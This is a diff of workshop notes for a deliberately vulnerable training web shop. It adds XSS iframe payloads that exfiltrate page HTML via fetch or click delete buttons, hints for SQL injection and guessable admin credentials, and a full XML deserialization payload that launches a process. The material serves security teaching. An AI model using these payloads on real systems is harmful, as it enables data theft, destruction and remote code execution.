@@ -96,5 +96,73 @@ newsshop
 ### Content Security Policy
 
 * not allowing onerrors to be defined in the page would prevent `<img onerror>` attacks
- 
+
+### more xss examples:
+* Blind XSS (executed on admin page)
+* send page content to other server
+```
+<iframe src="javascript:console.log('xss?', window.parent.document.body.innerHTML)"></iframe>
+
+<iframe src="javascript:fetch('http://localhost:8080', {
+  method: 'POST',
+  body: window.parent.document.body.innerHTML
+})
+"></iframe>
+```
+* delete entries in table
+```
+<iframe src="javascript:window.parent.document.querySelector('.delete-btn').click()"></iframe>
+```
+
 ### to be continued
+* add XSS to confirmation page
+* add OpenAPI 
+* add old urls in the frontend code (to hint at mail properties?)
+
+### Next steps:
+* docker
+* Struktur/Ablauf Workshop mit Secorvo, insbesondere die Inhalte (erstmal abwarten): Wie soll der Kurs laufen?
+* Folien fertigstellen
+* Tests für die Maßnahmen: Input Validation,...
+* Hints: über Anwendung, Handouts, über Fragen während des Workshops (die kann man schon vorbereiten)
+
+
+### how to get the participants to the attacks
+
+* admin password can be guessed (should just be used to see the results of XSS and not as an attack)
+* e-mail: enter same value twice
+* sql: try the different input fields, start with '
+* MailProperties: guess, try things out, admin dashboard
+
+### complete fetch code for invalid supply chain on mac 
+* post into browser console
+```
+fetch("http://localhost:8080/api/newsletter/import", {
+headers: {
+"accept": "application/json, text/plain, */*",
+"authorization": "Basic YWRtaW46YWRtaW4=",
+"cache-control": "no-cache",
+"Content-Type": "application/xml"
+},
+referrer: "http://localhost:8080/subscribe.html",
+referrerPolicy: "strict-origin-when-cross-origin",
+body: `<newsletter class="dynamic-proxy">
+        <interface>com.andrena.newsec.model.Newsletterable</interface>
+        <handler class="java.beans.EventHandler">
+            <target class="java.lang.ProcessBuilder">
+                <command>
+                    <string>open</string>
+                    <string>-a</string>
+                    <string>Calculator</string>
+                </command>
+            </target>
+            <action>start</action>
+        </handler>
+    </newsletter>`,
+method: "POST",
+mode: "cors",
+credentials: "include"
+});
+```
+
+
